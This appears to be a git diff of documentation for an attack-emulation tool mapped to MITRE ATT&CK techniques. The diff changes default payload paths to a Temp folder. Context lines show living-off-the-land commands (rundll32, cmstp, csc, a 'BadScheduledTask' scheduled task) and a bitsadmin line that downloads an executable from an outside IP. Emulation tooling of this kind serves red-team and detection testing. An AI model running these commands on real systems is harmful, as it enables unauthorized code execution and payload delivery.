@@ -59,7 +59,7 @@
 
 | **Parameter** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| filePath      | The local file path of the VB script. 默认`./file/T1059.005.vbs` |
+| filePath      | The local file path of the VB script. 默认`C:\Windows\Temp\files\T1059.005.vbs` |
 
 ### [T1059.007](https://attack.mitre.org/techniques/T1059/007/) Command and Scripting Interpreter: JavaScript/JScript
 
@@ -73,7 +73,7 @@
 
 | **Parameter** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
-| filePath      | The local file path of the JS script. 默认`./file/T1059.007.js` |
+| filePath      | The local file path of the JS script. 默认`C:\Windows\Temp\files\T1059.007.js` |
 
 ### [T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task/Job: Scheduled Task
 
@@ -88,7 +88,7 @@
 | **Parameter** | **Description**                                              |
 | ------------- | ------------------------------------------------------------ |
 | taskName      | The name of the task to be created. 默认`BadScheduledTask`   |
-| taskPath      | The path of the binary to be executed by the scheduled task. 默认`C:\Windows\Temp\xyz12345.exe` |
+| taskPath      | The path of the binary to be executed by the scheduled task. 默认`C:\Windows\Temp\files\xyz12345.exe` |
 | cleanup       | Bool parameter to delete the scheduled task after created. 默认false |
 
 ### [T1569.002](https://attack.mitre.org/techniques/T1569/002/) System Services: Service Execution
@@ -298,7 +298,7 @@ rundll32.exe $filePath
 
 | **Parameter** | **Description**                                    |
 | ------------- | -------------------------------------------------- |
-| filePath      | 需要执行的dll文件路径，默认`.\files\T1218.011.dll` |
+| filePath      | 需要执行的dll文件路径，默认`C:\Windows\Temp\files\T1218.011.dll` |
 
 
 
@@ -314,7 +314,7 @@ cmstp.exe /s /ns $filePath
 
 | **Parameter** | **Description**                          |
 | ------------- | ---------------------------------------- |
-| filePath      | 执行文件路径，默认`.\file\T1218.003.txt` |
+| filePath      | 执行文件路径，默认`C:\Windows\Temp\files\T1218.003.txt` |
 
 
 
@@ -403,7 +403,7 @@ C:Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseService
 
 | **Parameter** | **Description**                                    |
 | ------------- | -------------------------------------------------- |
-| filePath      | 需要执行的dll文件路径，默认`.\files\T1218.009.dll` |
+| filePath      | 需要执行的dll文件路径，默认`C:\Windows\Temp\files\T1218.009.dll` |
 
 
 
@@ -426,7 +426,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319>csc.exe /r:System.EnterpriseServ
 
 | **Parameter** | **Description**                                    |
 | ------------- | -------------------------------------------------- |
-| filePath      | 需要执行的exe文件路径，默认`.\files\T1218.004.exe` |
+| filePath      | 需要执行的exe文件路径，默认`C:\Windows\Temp\files\T1218.004.exe` |
 
 
 
@@ -443,7 +443,7 @@ bitsadmin.exe /transfer job /download /priority high $url $filePath
 | **Parameter** | **Description**                                          |
 | ------------- | -------------------------------------------------------- |
 | url           | 需要下载文件的url，默认http://100.1.1.169:8080/T1197.exe |
-| filePath      | 保存文件路径，默认C:\Windows\Temp\T1197.exe              |
+| filePath      | 保存文件路径，默认C:\Windows\Temp\files\T1197.exe          |
 
 
 
